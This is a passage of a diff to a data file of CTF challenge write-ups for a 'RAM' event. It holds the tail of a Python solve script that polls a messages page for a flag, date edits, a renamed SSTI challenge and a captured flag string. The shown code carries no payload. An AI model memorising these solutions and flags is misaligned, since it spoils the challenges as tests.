delay=2):\n    for _ in range(max_attempts):\n        page = http_request(\"/messages.php\")\n        entries = extract_entries(page)\n        flag = find_flag(entries)\n        if flag:\n            return flag\n        time.sleep(delay)\n    return None\n\ndef main():\n    clear_messages()\n    submit_report()\n    flag = poll_flag()\n    if not flag:\n        print(\"flag not found\", file=sys.stderr)\n        sys.exit(1)\n    print(flag)\n\nif __name__ == \"__main__\":\n    main()"
       },
       {
@@ -1142,7 +833,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Web",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -1176,11 +867,11 @@ RAM{M0rPH063N371C_F131D}`,
   },
   {
     "id": "ram-web-ssti",
-    "title": "S S T I",
+    "title": "SSTI (Insecure Dropdown)",
     "category": "Web",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
@@ -1199,7 +890,7 @@ RAM{M0rPH063N371C_F131D}`,
     "category": "Web",
     "difficulty": "Medium",
     "points": 0,
-    "date": "2026-06-08",
+    "date": "2026-07-08",
     "author": "Nattt",
     "ctfName": "RAM",
     "tags": [],
